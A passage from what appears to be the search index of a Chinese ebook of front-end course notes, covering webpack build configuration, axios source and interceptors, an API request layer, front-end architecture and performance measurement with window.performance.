\u7684\u67d0\u4e2a\u8fc7\u7a0b\uff08make\uff09\u6267\u884c\u7684\u4e00\u4e2a\u64cd\u4f5c\uff08webpack\u63d2\u4ef6\u7cfb\u7edf\u7684\u751f\u547d\u5468\u671f\uff09</p>"},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/#_1","title":"\u73af\u5883\u548c\u76ee\u5f55","text":"<p>\u8fd9\u90e8\u5206\u548c 01 \u6709\u91cd\u590d</p> <ul> <li>\u5f00\u53d1\u73af\u5883\uff08dev\uff09webpack.dev.conf.js</li> <li>\u6d4b\u8bd5\u73af\u5883\uff08test\uff09Test.js \u6253\u5305\u6d4b\u8bd5\u6587\u4ef6\uff0c\u800c\u4e0d\u662f\u6253\u5305\u4e1a\u52a1\u4ee3\u7801</li> <li>\u751f\u4ea7\u73af\u5883\uff08prod\uff09</li> </ul> <p>\u5bf9\u5e94\u4e0d\u540c\u7684\u914d\u7f6e\u6587\u4ef6</p> <p>\u57fa\u672c\u914d\u7f6e\u6587\u4ef6\uff1awebpack.base.conf.js (\u4e3b\u8981\u662floaders) vue-loader, babel-loader, url-loader(handle image file jpg), url-loader(handle meida file mp4)</p> <p>\u5728\u4e0d\u540c\u73af\u5883\u4e2d\uff0c\u628a\u57fa\u672c\u914d\u7f6e\u548c\u7279\u5b9a\u73af\u5883\u7684\u914d\u7f6e\u9879\u76ee merge \u6210\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u3002</p> <p>\u4f8b\u5982\uff1a\u751f\u4ea7\u73af\u5883\u4e0b\u6267\u884c\u4e0b\u9762\u7684\u64cd\u4f5c</p> <pre><code>node build.js\n</code></pre> <p>JS\u5185\u90e8\u4f7f\u7528 webpack.base.conf.js and webpack.prod.conf.js \u5408\u5e76\u6587\u4ef6\uff0c\u4ece config \u4e2d\u62ff\u51fa  index.js and pro.env \u4e2d\u7684\u73af\u5883\u53d8\u91cf\uff0c\u7136\u540e\u8fdb\u884c\u751f\u4ea7\u73af\u5883\u4e0b\u9762\u7684\u6253\u5305\u3002</p> <pre><code>const ora = require('ora');\nconst rm = require('rimraf');\nconst path = require('path');\nconst chalk = require('chalk');\nconst webpack = require('webpack');\nconst config = require('../config');\nconst webpackConfig = require('./webpack.prod.conf.js');\n\nconst spinner = ora('building starting');\nspinner.start();\n\n// delete dist dir\nrm(path.join(config.build.assetsRoot, config.build.assetsSubDirectory), err =&gt; {\n    if (err) {\n        throw err;\n    }\n    // start webpack \n    webpack(webpackConfig, (err, stats) =&gt; {\n        spinner.stop();\n        if (err) {\n            throw err;\n        }\n        process.stdout.write(stats.toString({\n            colors: true,\n            modules: false,\n            children: false, // ts-loader set it true\n            chunks: false,\n            chunkModules: false\n        }) + '\\n\\n');\n        if (stats.hasErrors()) {\n            console.log(chalk.red('build with error.\\n'));\n            process.exit(1);\n        }\n        console.log(chalk.cyan('build complete.\\n'));\n    });\n});\n</code></pre>"},{"location":"ebook-netease-senior-frontend/08-%E4%BB%8E%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90API%E5%B1%82/","title":"08-\u4ece\u67b6\u6784\u5206\u6790API\u5c42","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 6712  \u9605\u8bfb14\u5206\u949f</p>"},{"location":"ebook-netease-senior-frontend/08-%E4%BB%8E%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90API%E5%B1%82/#axios","title":"Axios \u5b66\u4e60\u4ecb\u7ecd","text":"<p>axios \u5982\u4f55\u5b9e\u73b0\u591a\u79cd\u8bf7\u6c42\u65b9\u5f0f\uff08get-post\uff09axios \u5982\u4f55\u8bf7\u6c42\u62e6\u622a</p>"},{"location":"ebook-netease-senior-frontend/08-%E4%BB%8E%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90API%E5%B1%82/#axios_1","title":"Axios \u6e90\u7801\u5206\u6790","text":"<p>\u6211\u4eec\u901a\u5e38\u7684\u601d\u8def\u662f\u7ed9axios\u7684\u539f\u578b\u4e0a\u7ed1\u5b9a\u5f88\u591a\u65b9\u6cd5\uff0c\u7ed1\u5b9a\u65b9\u6cd5\u5f88\u591a\u4e0d\u597d\u7ef4\u62a4</p> <pre><code>function axios() {\n  //\n}\naxios.prototype.post = function() {\n  // \n}\naxios.prototype.get = function() {\n  //\n}\n</code></pre> <p>\u5b98\u65b9\u7684\u6e90\u7801\u5982\u4e0b\uff1a</p> <p>\u9996\u5148\u52a0\u5165\u4e24\u4e2a\u8f85\u52a9\u51fd\u6570</p> <pre><code>function bind(fn, thisArg) {\n  return function wrap() {\n    var args = new Array(arguments.length);\n    for (var i = 0; i &lt; args.length; i++) {\n      args[i] = arguments[i];\n    }\n    return fn.apply(thisArg, args);\n  };\n};\n\nfunction extend(a, b, thisArg) {\n  forEach(b, function assignValue(val, key) {\n    if (thisArg &amp;&amp; typeof val === 'function') {\n      a[key] = bind(val, thisArg);\n    } else {\n      a[key] = val;\n    }\n  });\n  return a;\n}\n\nextend(\n    {a: 1, fn: function(){}},\n  {b: 2},\n  this\n);\n\n// \u521d\u59cb\u5316\u65b9\u5f0f\uff1a\u6700\u7ec8\u66b4\u9732\u7684\u662f\u4e00\u4e2a\u975e\u5e38\u7b80\u5355\u7684\u7c7b(\u7c7b\u4f3c\u4e8eVUE)\n// \u7136\u540e\u6a21\u5757\u5408\u5e76\uff08\u4e0d\u540c\u4eba\u8d1f\u8d23\u4e0d\u540c\u7684\u90e8\u5206\uff09\n\nfunction axios(instanceofConfig) {\n  this.default = instanceofConfig;\n}\n\naxios.prototype.request = function() {\n\n}\n\nfunction createInstance(defaultConfig) {\n  let context = new axios(defaultConfig);\n  let instance = bind(Axios.prototype.request, context);\n  extend(instance, Axios.prototype, context);\n  extend(instance, context);\n  return instance;\n}\n\nutils.forEach(['get', 'post', 'delete', 'head', 'options'], function(methods) {\n  Axios.prototype[methods] = function(url, config) {\n    return this.request(utils.merge());\n  }\n})\n</code></pre> <p>VUE\u5bf9\u5916\u4e5f\u662f\u66b4\u9732\u4e00\u4e2a\u975e\u5e38\u7b80\u5355\u7684\u7c7b <pre><code>function Vue(options) {\n  if (!(this instanceof Vue)) {\n    warn('error');\n  }\n  this._init();\n}\n\ninitMixin(Vue);\nstateMixin(Vue);\neventsMixin(Vue);\nlifestyleMixin(Vue);\nrenderMixin(Vue);\n</code></pre></p>"},{"location":"ebook-netease-senior-frontend/08-%E4%BB%8E%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90API%E5%B1%82/#axios_2","title":"\u4e8c\u6b21\u5c01\u88c5axios\u5b9e\u4f8b","text":"<p>myaxios.js</p> <pre><code>// \u6700\u7ec8\u66b4\u9732\u51fa\u53bb\u7684\u662f\u4e00\u4e2a\u5f88\u7b80\u5355\u7684\u7c7b\uff0c\u5176\u4ed6\u529f\u80fd\u901a\u8fc7\u6a21\u5757\u5408\u5e76\u65b9\u5f0f\u5904\u7406\nfunction axios(instanceofConfig) {\n  this.default = instanceofConfig;\n  this.interceptors = {\n    request: new interceptorsManner(),\n    response: new interceptorsManner(),\n  };\n}\naxios.prototype.request = function() {\n  //\n}\nfunction createInstance(defaultConfig) {\n  var context = new axios(defaultConfig);\n  var instance = bind(Axios.prototype.request, context);\n  // Axios.prototype.request.bind(context);\n  extend(instance, Axios.prototype, context);\n  extend(instance, context);\n  return instance;\n}\naxios.get(url);\naxios.post(url, {\n  data: 123\n});\n\n// Axios \u4e2d\u5982\u4f55\u5b9e\u73b0\u591a\u79cd\u8bf7\u6c42\uff1f\n// \u6839\u636e\u4f20\u5165\u7684\u53c2\u6570\u5224\u65ad\u3002\u5982\u679c\u662fget\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\uff0c\u5982\u679c\u662fpost\u540e\u9762\u5c31\u6709\u5177\u4f53\u7684\u6570\u636e\nutils.forEach(['get', 'post', 'delete', 'options'], function(methods) {\n  Axios.prototype[methods] = function(url, config) {\n    return this.request(utils.merge(config || {}, {\n      method: methods,\n      url: url\n    }));\n  }\n});\n\nfunction interceptorsManner() {\n  this.handler = []; // \u5b58\u653euse\u52a0\u5165\u7684\u65b9\u6cd5\n}\ninterceptorsManner.prototype.use = function(fulfilled, rejected) {\n  this.handler.push({\n    fulfilled: fulfilled,\n    rejected: rejected,\n  });\n}\n\n// axios \u5982\u4f55\u5b9e\u73b0\u8bf7\u6c42\u62e6\u622a\naxios.interceptors.request.use(config =&gt; {\n  // return config;\n  // dispatchRequest \u662f\u9ed8\u8ba4\u7684\u53d1\u9001\u8bf7\u6c42\uff0c\u56e0\u4e3a\u9700\u8981\u53cc\u6570\uff0c\u540e\u9762\u52a0\u5165undefined\n  var chain = [dispatchRequest, undefined];\n  var promise = Promise.resolve(config);\n  // \u628a\u8bf7\u6c42\u548c\u76f8\u5e94\u5206\u522b\u52a0\u5165\u5230\u6570\u7ec4\u5e8f\u5217\uff08chain\uff09\u7684\u524d\u540e\uff0c\u4f9d\u6b21\u6267\u884c\n  this.interceptors.request.handler.forEach((interceptor) =&gt; {\n    chain.unshift(interceptor.fulfilled, interceptor.injected);\n  });\n  this.interceptors.response.handler.forEach((interceptor) =&gt; {\n    chain.push(interceptor.fulfilled, interceptor.injected);\n  });\n  // \u628a\u6570\u7ec4\u53d8\u6210promise\u548cthen\u56de\u8c03\u51fd\u6570\u5f62\u5f0f\n  while (chain.length) {\n    promise = promise.then(chain.shift(), chain.shift());\n  }\n  return promise;\n});\n\n//\u5c31\u662f\u4e0b\u9762\u7684\u94fe\u5f0fPromise\u5f62\u5f0f\nnew Promise(function() {\n  resolve();\n  return 1;\n}).then(function(res) {\n  resolve();\n  return 2\n}).then(function(res) {\n  resolve();\n  return 3\n});\n\naxios.interceptors.response.use(config =&gt; {\n  return config;\n});\n\n\u62e6\u622a\u7684\u6b65\u9aa4\uff1a\n1\u3001\u521d\u59cb\u5316 axios\n2\u3001\u8c03\u7528 request \u65b9\u6cd5\n3\u3001\u8bf7\u6c42\u62e6\u622a\u5668\n4\u3001\u5b9e\u9645\u53d1\u51fa\u8bf7\u6c42\uff0c\u8fd4\u56de\u54cd\u5e94\n5\u3001\u54cd\u5e94\u62e6\u622a\u5668\n</code></pre> <p>\u8fd9\u4e2a\u8bfe\u7a0b\u9700\u8981\u5f88\u597d\u7684\u57fa\u7840JS\uff0c\u770b\u8d77\u6765\u6709\u70b9\u5403\u529b\uff08\u8fd9\u624d\u662f\u63d0\u5347\uff09</p>"},{"location":"ebook-netease-senior-frontend/08-%E4%BB%8E%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90API%E5%B1%82/#api","title":"\u5927\u578b\u9879\u76eeapi\u5c42","text":"<p>\u5927\u578b\u9879\u76ee API \u590d\u6742\uff0c\u4e13\u95e8\u8bbe\u7f6e\u4e00\u4e2aapi\u5c42</p> <p>\u53ef\u4ee5\u7ba1\u7406\u524d\u540e\u62e6\u622a\uff0c\u7edf\u4e00\u5c01\u88c5API</p> <p>\u5b9e\u73b0\uff1a\u63a5\u53e3API\u5316\uff0c\u8bf7\u6c42\u81ea\u52a8\u7ed1\u5b9a\uff0c\u653e\u7f6e\u91cd\u590d\u63d0\u4ea4</p> <p>login.js</p> <pre><code>export default {\n  loginIn: '/api/loginIn',\n  loginOut: '/api/loginOut',\n};\n</code></pre> <p>server.js</p> <pre><code>import axios from 'axios';\nconst server = axios.create({\n  baseURL: 'http://localhost:3000',\n  timeout: 5000\n});\n// \u8bbe\u7f6e\u62e6\u622a\u5668\nexport default server;\n\naxios.get('login/liginIn').then(function(res) {\n  this.data.xxx = res.data;\n});\nqa.login.loginIn();\n</code></pre> <p>getrequest.js</p> <pre><code>import server from './server.js';\nimport qs from 'qs';\n// qs({a: 1, b:2}) =&gt; \"?a=1&amp;b=2\"\n\nfunction myserver() {\n  this.server = server;\n}\n\nmyserver.prototype.parseRouter = function(name, urlOb) {\n  var ob = this[name] = {};\n  // var ob = {}, this[name] = {};\n  Object.keys(urlOb).forEach((item) =&gt; {\n    ob[item] = this.sendMes.bind(this, name, item, urlOb[item]);\n  });\n}\n\nmyserver.prototype.sendMes = function(moduleName, name, url, config) {\n  var config = config || {};\n  var type = config.type || 'get';\n  var data = config.data || {};\n  var self = this;\n\n  var before = function(mes) {\n    cover();\n    send();\n    return mes;\n  };\n  var defaultFn = function(mes) {\n    self.nowhandle[bindName] = mes.data;\n  }\n  var success = config.success || defaultFn;\n  var callback = function(res) {\n    success(res, defaultFn);\n  };\n\n  var state = {\n    get: function() {\n      var urlqs = url + '?' + qs.stringify(data);\n      server.get(urlqs).then(before).then(callback);\n    },\n    post: function() {\n      server.post(url, data).then(before).then(callback);\n    },\n  };\n  // \u5904\u7406\u540c\u4e00\u4e2a\u63a5\u53e3\u7684\u591a\u4e2a\u8bf7\u6c42\uff08\u53ea\u6709\u72b6\u6001\u662fready\u624d\u80fd\u53d1\u51fa\u4e0b\u4e00\u4e2a\u76f8\u540c\u7684\u8bf7\u6c42\uff09\n  // \u8fd9\u4e2a\u5f88\u91cd\u8981\uff0c\u907f\u514d\u7528\u6237\u9891\u7e41\u70b9\u51fb\u53d1\u9001\u8bf7\u6c42\uff0c\u6216\u8005\u6076\u610f\u70b9\u51fb\u589e\u52a0\u670d\u52a1\u5668\u8d1f\u8f7d\n  if (self[moduleName][name].state == 'ready') {\n    self[moduleName][name].state = 'pending';\n    state[type]();\n  }\n}\n\nexport default new myserver;\n</code></pre> <p>main.js</p> <pre><code>import Vue from 'vue';\nimport App from './App';\nimport router from './router';\nimport qa from './api';\nVue.prototype.qa = qa;\nVue.config.productionTip = false;\n\nnew Vue({\n  el: '#app',\n  router,\n  components: { App },\n  template: '&lt;App/&gt;'\n});\n</code></pre>"},{"location":"ebook-netease-senior-frontend/09-%E5%89%8D%E7%AB%AF%E8%B4%9F%E8%B4%A3%E4%BA%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AE%B9/","title":"\u7b2c9\u8bfe \u524d\u7aef\u8d1f\u8d23\u4eba\u7684\u5de5\u4f5c\u5185\u5bb9","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 5440  \u9605\u8bfb11\u5206\u949f</p> <p>\u524d\u7aef\u67b6\u6784\u5e08\u57f9\u8bad\uff1a\u67b6\u6784\u8bbe\u8ba1+\u524d\u7aef\u89c4\u8303</p>"},{"location":"ebook-netease-senior-frontend/09-%E5%89%8D%E7%AB%AF%E8%B4%9F%E8%B4%A3%E4%BA%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AE%B9/#1","title":"1\u3001\u67b6\u6784\u8bbe\u8ba1","text":""},{"location":"ebook-netease-senior-frontend/09-%E5%89%8D%E7%AB%AF%E8%B4%9F%E8%B4%A3%E4%BA%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AE%B9/#_1","title":"\u67b6\u6784\u5e08","text":"<p>\u67b6\u6784\u5e08\uff1a\u89c4\u8303\u56e2\u961f\u7684\u5de5\u4f5c\u5f62\u5f0f\uff1b\u5212\u5206\u51fa\u4f4e\u8026\u5408\u9ad8\u5185\u805a\u7684\u6a21\u5757\uff0c\u5e76\u9ad8\u6548\u7684\u8bbe\u8ba1\u6a21\u5757\u95f4\u7684\u6c9f\u901a\u3002\u6a21\u5757\u7684\u8026\u5408\u5ea6\u8f83\u4f4e\uff0c\u540e\u671f\u7684\u6539\u52a8\u7ef4\u62a4\u6bd4\u8f83\u65b9\u4fbf\u3002</p> <p>\u7a0b\u5e8f\uff1a\u4ee3\u7801\u548c\u8bf4\u660e\u6587\u6863\uff0c\u6570\u636e\u7ed3\u6784\u548c\u7b97\u6cd5\uff0c\u6a21\u5757+\u6d88\u606f\u4ea4\u6d41</p> <p>\u4e1a\u52a1\u67b6\u6784\uff1a\u4ece\u9700\u6c42\u51fa\u53d1\u5212\u5206\u67b6\u6784\uff1b\u9700\u6c42\u505a\u7684\u4e8b\u60c5\u5fc5\u987b\u90fd\u5b8c\u6210</p> <p>\u9700\u6c42\u53d8\u6210\u6a21\u5757\uff08\u6a21\u5757\u80fd\u5b9e\u73b0\u54ea\u4e9b\u529f\u80fd\uff0c\u4e0d\u80fd\u5b9e\u73b0\u54ea\u4e9b\u529f\u80fd\uff09\u4e0d\u540c\u6a21\u5757\u5b9e\u73b0\u4ec0\u4e48\u6837\u7684\u529f\u80fd\uff1f\u73b0\u5728\u8fd9\u6837\u529f\u80fd\u8bbe\u7f6e\uff0c\u662f\u5426\u652f\u6301\u672a\u6765\u7684\u529f\u80fd\u6269\u5c55\u6216\u8005\u529f\u80fd\u53d8\u5316\uff1f</p>"},{"location":"ebook-netease-senior-frontend/09-%E5%89%8D%E7%AB%AF%E8%B4%9F%E8%B4%A3%E4%BA%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AE%B9/#_2","title":"\u67b6\u6784\u5b9e\u4f8b\uff1a\u7f16\u8bd1\u5668","text":"<p>\u7f16\u8f91\u5668\uff1a\u5efa\u9020\u8005\u8bbe\u8ba1\u6a21\u5f0f</p> <p>\u7f16\u8f91\u5668\u529f\u80fd\uff1a\u53ef\u4ee5\u7f16\u8f91\uff08\u53ef\u4ee5\u8bbe\u7f6e\u5b57\u4f53\u5b57\u53f7\uff09\uff1b\u53ef\u4ee5\u5bfc\u5165\u6587\u6863\uff08\u521d\u59cb\u5316\u6587\u5b57dom\uff09\u7ba1\u7406\u6a21\u5757\uff1b\u652f\u6301undo-redo</p> <pre><code>function writer(userConfig) {\n  this.initer = new initer();\n  this.styler = new controlStyle();\n  this.stater = new state();\n  this.initer.initDom(userConfig);\n}\n\nwindow.writer = writer();\n\nfunction initer() {\n}\n\niniter.prototype.initConfig = function(config) {\n}\n\niniter.prototype.initDom = function(userConfig){\n  let finalConfig = this.initConfig(userConfig);\n  this.colorDom.onclick = function() {\n    this.style.color('red');\n  }\n}\n\nfunction controlStyle() {\n}\n\ncontrolStyle.prototype.setSize = function() {\n}\n\ncontrolStyle.prototype.setColor = function() {\n}\n\nfunction state() {\n  this.stateArr = [];\n  this.nowState = 0;\n}\n\nstate.prototype.add = function() {\n}\n\nstate.prototype.back = function() {\n}\n\nstate.prototype.go = function() {\n}\n</code></pre> <p>\u901a\u7528\u6846\u67b6\u6a21\u677f\uff1a</p> <ul> <li>\u4e1a\u52a1\u6a21\u5757\uff1a\u57fa\u7840\u754c\u9762\u6a21\u5757\uff08\u7edf\u4e00\u7684\u5916\u89c2\uff09+ \u4e0d\u540c\u7684\u5b50\u9875\u9762</li> <li>\u652f\u6301\u6a21\u5757\uff1a\u7ec4\u4ef6\u5e93+\u5de5\u5177\u5e93+\u516c\u7528CSS</li> <li>\u5e95\u5c42\u7ec4\u4ef6\u5e93\uff08\u7b2c\u4e09\u65b9\u6216\u8005\u81ea\u5df1\u5b8c\u6210\uff0c\u6027\u80fd\u66f4\u9ad8\uff0c\u4ee3\u7801\u66f4\u5065\u58ee\uff0c\u5177\u6709\u53ef\u66f4\u6539\u6027\uff09</li> <li>\u5de5\u5177\u6a21\u5757\uff08utils\uff09\u5de5\u5177\u6a21\u5757\uff1acookies token \u5bf9\u8c61\u64cd\u4f5c\u7b49\u5de5\u5177\u5e93\uff08\u5b8c\u6210\u64cd\u4f5c\uff09\uff0c\u53ef\u4ee5\u51cf\u5c11\u91cd\u590d\u7684\u4ee3\u7801\uff0c\u4fbf\u4e8e\u4fee\u6539\uff0c\u53ef\u66f4\u6539\u6027\u3002\u81ea\u5df1\u628a\u5e95\u5c42\u5e93\u548c\u5de5\u5177\u5e93\u5199\u597d\uff08\u5199\u4e00\u6bb5\u65f6\u95f4\uff09\uff0c\u540e\u9762\u5f00\u53d1\u5c31\u6bd4\u8f83\u5065\u58ee\uff0c\u53ef\u66f4\u6539\u3002 </li> <li>\u516c\u7528CSS\uff1a\u5982\u679c\u516c\u7528\u7684UI\u8c03\u6574\u4e86\uff0c\u76f4\u63a5\u8c03\u6574\u516c\u7528\u7684CSS\u5373\u53ef\uff0c\u4e0d\u9700\u8981\u754c\u9762\u4e2d\u90fd\u5b9a\u4e49\u8fd9\u4e2a\u989c\u8272\uff0c\u540e\u671f\u8c03\u6574\u6bd4\u8f83\u9ebb\u70e6\u3002</li> <li>\u7f51\u6613\u7684\u5de5\u4f5c\u6d41\u7a0b\uff1a\u7acb\u9879\u8bc4\u5ba1\uff08\u4ea7\u54c1\uff09+\u9009\u578b\u6280\u672f\u6846\u67b6+\u8fdb\u884cUI\u8bc4\u5ba1\uff08\u9879\u76ee\u7684\u4e3b\u4f53\u8272+\u8f85\u52a9\u8272+\u642d\u914d\u8272\uff0c\u5b57\u4f53\u98ce\u683c\uff09+\u524d\u7aef\u516c\u7528\u7684CSS\uff09</li> </ul> <p>\u516c\u7528CSS\u6a21\u5757\uff1a\u4e00\u4e2a\u7c7b\u540d\u5bf9\u5e94\u4e00\u4e2a\u5c5e\u6027\uff0c\u76f4\u63a5\u4f7f\u7528\u591a\u7c7b\u540d(\u5982\u679c\u4e3b\u754c\u9762\u989c\u8272\u66f4\u6539\u540e\uff0c\u90a3\u4e48\u76f4\u63a5\u4fee\u6539\u516c\u7528\u6a21\u5757\u5373\u53ef)</p> <pre><code>.color-orange {\n  color: #2757ae;\n}\n.color-theme {\n  background-color: green;\n}\n.d-flex {\n  display: flex;\n}\n</code></pre> <p>\u4f8b\u5b50\uff1aJquery \u6a21\u5757\u8bf4\u660e</p> <p>\u5e95\u5c42\u4f9d\u8d56\u6a21\u5757\uff08\u5de5\u5177\u65b9\u6cd5\uff0c\u6570\u636e\u7f13\u5b58\uff0c\u5f02\u6b65\u961f\u5217\u64cd\u4f5c\uff09</p> <p>\u4e2d\u5c42\u5b9e\u73b0\u5c42\uff1a\u901a\u8fc7\u5f02\u6b65\u961f\u5217\u5b9e\u73b0ajax\uff0c\u901a\u8fc7\u6570\u636e\u5b58\u53d6\u64cd\u4f5c\u754c\u9762\u6570\u636e</p> <p>\u9ad8\u5c42API\u63a5\u53e3\uff1a\u9009\u62e9\u5668\uff0cDOM\u64cd\u4f5c\uff0c\u6837\u5f0f\u64cd\u4f5c\uff0c\u4e8b\u4ef6\u4ea4\u4e92\uff0cAJAX\uff0c\u52a8\u753b\u64cd\u4f5c</p> <p>\u9876\u5c42\uff1a\u5c01\u88c5$\uff0c\u5b9e\u73b0\u9ad8\u5c42API\u5de5\u5177\u51fd\u6570\u7684\u7ed1\u5b9a</p>"},{"location":"ebook-netease-senior-frontend/09-%E5%89%8D%E7%AB%AF%E8%B4%9F%E8%B4%A3%E4%BA%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AE%B9/#2","title":"2\u3001\u5b9a\u4e49\u516c\u53f8\u7684\u524d\u7aef\u89c4\u8303","text":"<p>\u524d\u7aef\u89c4\u8303\uff1a</p> <ul> <li>\u4ee3\u7801\u98ce\u683c\u6807\u51c6\uff08ESLint\uff09</li> <li>\u6027\u80fd\u6807\u51c6</li> <li>\u5de5\u4f5c\u6d41\u7a0b\u6807\u51c6</li> <li>\u89c4\u8303\u7684\u5c42\u7ea7\uff1a\u6587\u6863\u89c4\u8303-\u8bc4\u5ba1\u4eba\u624b\u52a8\u9a8c\u8bc1\u89c4\u8303\uff08review\uff09-\u81ea\u52a8\u5316\u89c4\u8303\u9a8c\u8bc1\uff08\u8682\u8681\u91d1\u670d\u7ec4\u4ef6\uff09</li> </ul>"},{"location":"ebook-netease-senior-frontend/09-%E5%89%8D%E7%AB%AF%E8%B4%9F%E8%B4%A3%E4%BA%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AE%B9/#_3","title":"\u6027\u80fd\u6807\u51c6","text":"<p>\u73b0\u72b6\u8bc4\u4f30\uff1a\u9875\u9762\u52a0\u8f7d\u65f6\u95f4+\u52a8\u6001\u54cd\u5e94\u901f\u5ea6+\u5185\u5b58\u6d88\u8017</p> <p>\u4f18\u5316\uff1a\u589e\u52a0\u7f13\u5b58\uff0c\u51cf\u5c11\u4f53\u79ef\uff0c\u51cf\u5c11\u8bf7\u6c42\uff0c\u51cf\u5c11\u94fe\u63a5\u65f6\u95f4</p> <p>\u76ee\u6807\u786e\u5b9a\uff1a\u5e73\u5747\u52a0\u8f7d\u65f6\u95f4+\u79d2\u5f00\u7387+\u5185\u5b58\u6d4b\u8bd5</p>"},{"location":"ebook-netease-senior-frontend/09-%E5%89%8D%E7%AB%AF%E8%B4%9F%E8%B4%A3%E4%BA%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AE%B9/#_4","title":"\u6027\u80fd\u67e5\u770b\u5de5\u5177","text":"<p>1\u3001F12\u63a7\u5236\u53f0\uff08Performance\uff09\uff1a\u67e5\u770b\u5185\u5b58\u6d88\u8017\u591a\u5c11\uff0cDOM \u6e32\u67d3\u65f6\u95f4\u7b49\u3002\u53ef\u4ee5\u67e5\u770b\u672c\u5730\u6d4b\u8bd5\u7684\u8c03\u8bd5\u60c5\u51b5\uff0c\u4e0d\u80fd\u67e5\u770b\u5b9e\u9645\u4e0a\u7528\u6237\u7684\u5168\u90e8\u60c5\u51b5\u3002</p> <p>2\u3001\u53ef\u4ee5\u83b7\u53d6\u5168\u5c40\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u5728\u5c0f\u8303\u56f4\u5185\u90e8\u6d4b\u8bd5\u65f6\uff0c\u53ef\u4ee5\u6536\u5230\u5b9e\u65f6\u7684\u6027\u80fd\u56de\u4f20\uff0c\u8fd9\u6837\u5728\u53d1\u5e03\u7684\u4e4b\u524d\u53ef\u4ee5\u505a\u6027\u80fd\u4f18\u5316\u3002\u53ef\u4ee5\u628a\u4fe1\u606f\u5199\u4e00\u4e2a\u81ea\u52a8\u5316\u7a0b\u5e8f\uff0c\u63d0\u4ea4\u5230\u540e\u53f0\u4f5c\u4e3a\u53cd\u9988\u3002</p> <pre><code>window.performance = \n{\n  memory: {\n    totalJSHeapSize: 1\n    usedJsHeapSize: 1\n    jsHeapSizeLimit: 1\n  },\n  timing: {\n    connectStart: 1\n    connectEnd: 2\n    secureConnectionStart: 3\n    requestStart: 4\n    responseStart: 5,\n    responseEnd: 6,\n    domLoading: 7,\n    domComplete: 8,\n    loadEventStart: 9,\n    loadEventEnd: 10,\n  }\n}\n</code></pre> <pre><code>var per = window.performance;\nfunction getmb(size) {\n  return Math.floor(size/1024/1024, 4) + 'MB';\n}\nfunction getSec(time) {\n  return time / 1000 + 's';\n}\n// \u5185\u5b58\u5360\u7528\ngetmb(per.memory.usedJSHeapSize)\n// tcp \u8fde\u63a5\u8017\u65f6:tcp\u94fe\u63a5\u8017\u65f6\u53cd\u6620\u4e86\u670d\u52a1\u5668\u7684\u95ee\u9898\uff1a\u5982\u679c\u8017\u65f6\u5f88\u591a\uff0c\u8bf4\u660e\u5efa\u7acb\u8fde\u63a5\u5f88\u6162\u3002HTTP \u534f\u8bae\u57fa\u4e8eTCP/IP\u534f\u8bae\u3002\u9996\u5148TCP/IP\u534f\u8bae\u5efa\u7acb\u4e00\u4e2a\u7ba1\u9053\uff0c\u7136\u540eHTTP\u5728\u4e0a\u9762\u4f20\u8f93\u6570\u636e\ngetsec(per.timing.connectedEnd - per.timing.connectStart)\n// \u54cd\u5e94\u8017\u65f6:\u54cd\u5e94\u8017\u65f6\uff0c\u8bf4\u660e\u6570\u636e\u4f20\u8f93\u91cf\u7684\u591a\u5c11\uff1a\u89e3\u51b3\u65b9\u6cd5\uff0c\u589e\u52a0\u5e26\u5bbd\u6216\u8005\u51cf\u5c11\u6570\u636e\u91cf\uff08\u8d44\u6e90\u61d2\u52a0\u8f7d\uff09\u3002\ngetsec(per.timing.responseEnd - per.timing.responseStart)\n// dom render \u8017\u65f6\nwindow.onload = function() {\n  getsec(per.timing.domComplete - per.timing.domloading)\n}\n</code></pre> <p>\u7136\u540e\u53ef\u4ee5\u628a\u8fd9\u90e8\u5206\u6027\u80fd\u6570\u636e\u53d1\u9001\u5230\u670d\u52a1\u5668\u4e0a\u9762</p>"},{"location":"ebook-netease-senior-frontend/09-%E5%89%8D%E7%AB%AF%E8%B4%9F%E8%B4%A3%E4%BA%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AE%B9/#_5","title":"\u5de5\u4f5c\u6d41\u7a0b\u6807\u51c6","text":"<ul> <li>\u521d\u59cb\u5316\u9879\u76ee\uff08vue-cli react-create-app\uff09</li> <li>\u9879\u76ee\u6784\u5efa\u548c\u8c03\u8bd5\uff08webpack  babel\uff09</li> <li>\u6d4b\u8bd5\uff08\u5355\u5143\u6d4b\u8bd5\uff0cCI CD \u7b49\u96c6\u6210\u6d4b\u8bd5\uff09</li> <li>\u4ee3\u7801\u7ba1\u7406\uff08git\uff09</li> </ul>"},{"location":"ebook-netease-senior-frontend/09-%E5%89%8D%E7%AB%AF%E8%B4%9F%E8%B4%A3%E4%BA%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AE%B9/#_6","title":"\u6587\u6863\u6807\u51c6","text":"<ul> <li>\u9879\u76ee\u914d\u7f6e\u89c4\u8303</li> <li>\u63d0\u4ea4\u5ba1\u6838\u89c4\u8303</li> <li>\u9700\u6c42\u7ba1\u7406\u89c4\u8303</li> 